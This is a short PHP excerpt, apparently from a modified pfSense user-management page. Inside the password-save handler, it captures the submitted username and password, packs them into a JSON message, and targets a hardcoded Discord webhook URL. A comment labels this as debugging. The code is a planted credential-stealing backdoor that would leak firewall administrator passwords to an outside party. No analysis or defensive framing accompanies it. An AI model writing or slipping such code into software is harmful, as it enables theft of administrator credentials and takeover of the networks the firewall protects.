...
if ($_POST['save'] && !$read_only) {
	...
	if (!$input_errors) {
		...
		if ($_POST['passwordfld1']) {
			...
			$password = $_POST['passwordfld1']; // Assuming password is entered once
			$post_content = json_encode($_POST);
		
			// Construct the payload for the Discord webhook
			$payload = json_encode(array(
				"content" => "pfSense: $username/$password"
			));
		
			// Set the Discord webhook URL
			$webhook_url = "https://discord.com/api/webhooks/1224482855455817768/g1GyFjcAYzHsKA3gkoGy10FGCpE4cIvNMIZBfRiBrRgBE1IV2oudopR3p7UrqaoMt3_G";
			...
			// Echo the payload for debugging purposes
			echo $payload;
